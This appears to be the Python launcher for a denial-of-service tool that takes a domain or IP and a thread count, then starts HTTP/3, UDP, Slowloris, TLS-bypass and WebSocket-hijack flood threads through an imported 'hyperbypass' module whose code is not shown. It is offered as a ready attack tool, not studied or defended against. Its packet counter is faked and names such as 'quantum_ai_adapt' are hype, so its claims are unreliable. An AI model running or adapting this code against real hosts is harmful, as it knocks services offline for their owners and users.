import sys
import threading
import time
import random
import hyperbypass
from hyperbypass import QuantumDestruction

packet = 95500
byte = 95000
clone_factor = 10
packet_count = 0
stop_event = threading.Event()
status = "Unknown"

def monitor_status(target):
    global status
    while not stop_event.is_set():
        attack_status = hyperbypass.monitor_target(target)
        print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {attack_status}", end="", flush=True)
        time.sleep(0.5)

def attack(target, threads, attack_type):
    global packet_count
    stop_event.clear()

    attack_instance = QuantumDestruction(target, attack_type)
    monitor_thread = threading.Thread(target=monitor_status, args=(target,))
    monitor_thread.start()

    for _ in range(threads):
        threading.Thread(target=attack_instance.http3_flood).start()
        threading.Thread(target=attack_instance.tls_bypass).start()
        threading.Thread(target=attack_instance.websocket_hijack).start()
        threading.Thread(target=attack_instance.udp_apocalypse).start()
        threading.Thread(target=attack_instance.slowloris_stealth).start()
        threading.Thread(target=attack_instance.quantum_ai_adapt).start()

    try:
        while True:
            time.sleep(0.5)
            packet_count += clone_factor
    except KeyboardInterrupt:
        print("\n[!] Attack Stopped.")
        stop_event.set()
        monitor_thread.join()

def main():
    if len(sys.argv) < 3:
        print("\nUsage:")
        print(" - Domain Attack: python main.py example.com 100")
        print(" - IP Attack: python main.py -a 192.168.1.1 100")
        print(" - Raw IP (No Protocol): python main.py -ip 192.168.1.1 100\n")
        sys.exit(1)

    if sys.argv[1] == "-a":
        target = sys.argv[2]
        attack_type = "IP"
    elif sys.argv[1] == "-ip":
        target = sys.argv[2]
        attack_type = "RAW_IP"
    else:
        target = sys.argv[1]
        attack_type = "HTTP"

    threads = int(sys.argv[3] if sys.argv[1] in ["-a", "-ip"] else sys.argv[2])
    attack(target, threads, attack_type)

if __name__ == "__main__":
    main()
